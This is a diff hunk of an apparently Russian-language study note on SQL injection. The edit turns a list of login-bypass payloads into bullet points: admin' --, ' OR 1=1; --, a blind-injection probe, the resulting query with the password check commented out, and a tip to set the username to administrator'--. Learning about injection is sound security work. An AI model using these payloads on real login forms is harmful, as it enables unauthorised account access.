@@ -15,9 +15,9 @@ SQL-инъекция — это уязвимость веб-безопаснос
 - ' AND 1=1-- (для слепой)
 
 ## 2. Обход аутентификации (Login Bypass)
-admin' --
-' OR 1=1; --
-SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+- admin' --
+- ' OR 1=1; --
+ SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 Измените usernameпараметр, присвоив ему значение:administrator'--
 
 ## 3. UNION-атака (определение колонок)
